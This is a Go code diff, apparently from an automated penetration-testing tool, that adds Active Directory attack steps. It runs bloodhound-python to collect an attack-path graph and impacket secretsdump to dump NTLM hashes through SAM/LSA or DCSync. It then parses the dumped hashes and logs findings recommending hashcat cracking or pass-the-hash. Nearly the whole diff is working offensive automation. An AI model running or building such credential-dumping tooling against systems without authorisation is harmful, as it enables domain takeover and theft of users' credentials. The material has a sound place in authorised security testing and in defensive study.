@@ -40,6 +40,8 @@ func Run(ctx context.Context, cfg *config.Config, rn *runner.Runner, st *store.S
 	kerbrute(ctx, rn, st, ev, ad)
 	asRepRoast(ctx, rn, st, ev, ad)
 	kerberoast(ctx, rn, st, ev, ad)
+	bloodhound(ctx, rn, st, ev, ad, st.Dir())
+	secretsDump(ctx, rn, st, ev, ad)
 }
 
 func credNote(ad config.AD) string {
@@ -184,6 +186,102 @@ func kerberoast(ctx context.Context, rn *runner.Runner, st *store.Store, ev even
 	if n > 0 {
 		ev.Logf("  Kerberoast: хэшей %d\n", n)
 	}
+}
+
+// bloodhound собирает граф AD (bloodhound-python). Нужны креды. Результат —
+// JSON/zip в каталоге работы для импорта в BloodHound GUI.
+func bloodhound(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, ad config.AD, dir string) {
+	if !rn.Has("bloodhound-python") || ad.Username == "" {
+		return
+	}
+	ev.Logln("  bloodhound-python: собираю граф AD...")
+	args := []string{"-d", ad.Domain, "-u", ad.Username, "-p", ad.Password,
+		"-dc", ad.DC, "-ns", ad.DC, "-c", "All", "--zip", "-op", dir + "/bloodhound"}
+	r := rn.Run(ctx, "bloodhound-python", args...)
+	var detail string
+	for _, line := range r.Lines {
+		l := strings.TrimSpace(line)
+		low := strings.ToLower(l)
+		if strings.Contains(low, "found") && (strings.Contains(low, "user") || strings.Contains(low, "computer") || strings.Contains(low, "group")) {
+			detail += trim(l, 80) + "; "
+		}
+		if strings.Contains(low, "compressing") || strings.Contains(low, ".zip") {
+			detail += "zip собран; "
+		}
+	}
+	if detail == "" {
+		detail = "граф собран (см. *.json/zip в каталоге работы)"
+	}
+	st.Add(store.Finding{Target: ad.Domain, Type: store.TypeAD, Severity: store.SevInfo,
+		Title: "BloodHound: граф AD собран", Detail: trim(detail, 300),
+		Evidence: "импортируй " + dir + "/bloodhound*.zip в BloodHound для анализа путей атаки",
+		Tool:     "bloodhound-python", Tags: []string{"ad", "bloodhound", "graph"}})
+	ev.Logln("  bloodhound-python: готово")
+}
+
+// secretsDump выгружает NTLM-хэши (impacket secretsdump): SAM/LSA или NTDS
+// (DCSync при доменных правах). Нужны креды. Выгруженные хэши — критично.
+func secretsDump(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, ad config.AD) {
+	bin := impacketBin(rn, "secretsdump")
+	if bin == "" || ad.Username == "" {
+		return
+	}
+	ev.Logln("  secretsdump: выгружаю хэши...")
+	target := ad.Domain + "/" + ad.Username + ":" + ad.Password + "@" + ad.DC
+	r := rn.Run(ctx, bin, target)
+	n := 0
+	var sample string
+	for _, line := range r.Lines {
+		l := strings.TrimSpace(line)
+		// формат NTLM: user:rid:lmhash:nthash:::
+		if hashLine(l) {
+			n++
+			if sample == "" {
+				sample = redactHash(l)
+			}
+		}
+	}
+	if n > 0 {
+		st.Add(store.Finding{Target: ad.DC, Type: store.TypeAD, Severity: store.SevCritical,
+			Title:    "secretsdump: выгружено NTLM-хэшей " + itoa(n),
+			Detail:   "дамп учётных данных домена/хоста — крекать hashcat -m 1000 или pass-the-hash",
+			Evidence: "пример: " + sample, Tool: bin,
+			Tags: []string{"ad", "credentials", "ntlm", "hash", "crackable", "dcsync"}})
+		ev.Logf("  secretsdump: хэшей %d\n", n)
+	}
+}
+
+// hashLine распознаёт строку NTLM-дампа user:rid:lm:nt:::
+func hashLine(s string) bool {
+	p := strings.Split(s, ":")
+	if len(p) < 4 {
+		return false
+	}
+	return isHex32(p[2]) && isHex32(p[3])
+}
+
+func isHex32(s string) bool {
+	if len(s) != 32 {
+		return false
+	}
+	for _, c := range s {
+		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
+			return false
+		}
+	}
+	return true
+}
+
+// redactHash прячет NT-хэш в доказательстве (виден юзер, не сам хэш).
+func redactHash(s string) string {
+	p := strings.Split(s, ":")
+	if len(p) >= 4 && len(p[3]) == 32 {
+		p[3] = p[3][:6] + "…" + p[3][28:]
+		if isHex32(p[2]) {
+			p[2] = "…"
+		}
+	}
+	return trim(strings.Join(p, ":"), 120)
 }
 
 // --- утилиты ---
